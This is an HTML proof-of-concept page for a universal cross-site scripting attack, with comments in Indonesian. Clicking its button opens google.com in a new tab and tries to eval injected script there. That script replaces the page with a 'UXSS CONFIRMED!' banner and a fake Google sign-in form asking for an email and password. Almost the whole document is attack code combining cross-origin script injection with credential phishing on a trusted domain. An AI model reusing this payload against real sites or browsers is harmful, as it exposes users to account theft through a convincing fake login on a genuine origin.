<!DOCTYPE html>
<html>
<body>
<button onclick="exploit()">RUN</button>
<pre id="status">...</pre>

<script>
function exploit() {
  const tab = window.open(
    "https://www.google.com", "_blank"
  );

  if (!tab) {
    document.getElementById('status').textContent = 
      'Popup blocked!';
    return;
  }

  setTimeout(() => {
    try {
      tab.eval(`
        (function() {
          if(window.__fbUxss) return;
          window.__fbUxss = 1;

          // Ganti alert dengan cara lain
          // untuk buktikan domain
          const domain = document.domain;
          const origin = location.origin;
          const href = location.href;

          // Tampilkan di halaman
          document.body.innerHTML = \`
            <div style="
              background:#fff;
              font-family:Arial;
              text-align:center;
              padding:40px;
            ">
              <h1 style="color:red;">
                UXSS CONFIRMED!
              </h1>
              <p><b>Domain:</b> \${domain}</p>
              <p><b>Origin:</b> \${origin}</p>
              <p><b>URL:</b> \${href}</p>
              <hr>
              <img src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png">
              <h2>Sign in</h2>
              <p>Use your Google Account</p>
              <input type="email" 
                placeholder="Email or phone"
                style="display:block;width:300px;
                       padding:12px;margin:10px auto;
                       border:1px solid #ccc;
                       border-radius:4px;font-size:16px;">
              <input type="password" 
                placeholder="Password"
                style="display:block;width:300px;
                       padding:12px;margin:10px auto;
                       border:1px solid #ccc;
                       border-radius:4px;font-size:16px;">
              <button style="
                background:#1a73e8;color:white;
                border:none;padding:12px 32px;
                border-radius:4px;font-size:16px;">
                Next
              </button>
            </div>
          \`;
        })();
      `);
      document.getElementById('status').textContent = 
        'Payload sent! Check new tab!';
    } catch(e) {
      document.getElementById('status').textContent = 
        'Failed: ' + e.message;
    }
  }, 800);
}
</script>
</body>
</html>
